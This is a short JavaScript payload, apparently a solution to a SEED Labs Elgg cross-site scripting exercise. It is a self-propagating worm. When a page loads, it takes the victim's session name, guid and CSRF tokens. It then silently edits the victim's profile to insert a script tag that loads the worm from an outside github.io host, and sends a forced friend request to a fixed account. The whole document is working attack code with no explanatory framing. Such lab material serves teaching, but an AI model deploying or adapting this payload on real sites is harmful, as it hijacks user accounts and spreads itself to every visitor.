<script type="text/javascript">
window.onload = function() {
    var Ajax = null;
    var Ajax2 = null;
    // 获取当前用户的名字、guid、token 和时间戳
    var userName = "&name=" + elgg.session.user.name;
    var guid = "&guid=" + elgg.session.user.guid;
    var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
    var token = "&__elgg_token=" + elgg.security.token.__elgg_token;

    // 构造要发送的数据，包括描述内容，注入恶意脚本
    var content = userName + guid + token + ts + "&description=<script type='text/javascript' src='https://z-summer-zhw.github.io/lab1/xss_worm.js'></script>";
    var samyGuid = 59;
    var profileEditUrl = "http://www.seed-server.com/action/profile/edit";
    var addfriendUrl = "http://www.seed-server.com/action/friends/add?friend=59" + ts + token;

    // 判断当前用户是否为 Samy，如果不是，则执行蠕虫代码
    if (elgg.session.user.guid != samyGuid) {
        // 初始化第一个 Ajax 请求，发送修改个人资料的请求
        Ajax = new XMLHttpRequest();
        Ajax.open("POST", profileEditUrl, true);
        Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        Ajax.send(content);

        // 初始化第二个 Ajax 请求，发送添加好友请求
        Ajax2 = new XMLHttpRequest();
        Ajax2.open("GET", addfriendUrl, true);
        Ajax2.send();
    }
}
</script>
